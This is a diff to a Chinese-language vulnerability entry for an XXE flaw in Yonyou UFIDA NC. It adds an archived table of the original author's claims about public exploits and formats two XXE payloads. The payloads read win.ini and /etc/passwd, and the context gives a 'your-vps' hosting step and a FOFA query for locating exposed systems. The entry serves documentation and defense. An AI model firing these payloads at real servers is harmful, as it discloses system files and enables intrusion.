@@ -60,6 +60,12 @@ schema_version: "1"
 |------|-------|-------|------|
 | 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |
 
+> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
+>
+> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
+> |------|-------|-------|------|
+> | 是 | 已公开 | 已公开 | 已知 |
+
 ### 风险等级
 
 | 维度 | 评价 |
@@ -76,10 +82,10 @@ python起http服务建立对应系统的xml
 http://your-vps:8000/linux.xml
 
 windows:
-<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///c://windows/win.ini">]><user><username>&name;</username><password>1</password></user>
+`<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///c://windows/win.ini">]><user><username>&name;</username><password>1</password></user>`
 
 linux:
-<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///etc/passwd">]><user><username>&name;</username><password>1</password></user>
+`<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///etc/passwd">]><user><username>&name;</username><password>1</password></user>`
 
 
 FOFA：app="用友-UFIDA-NC"
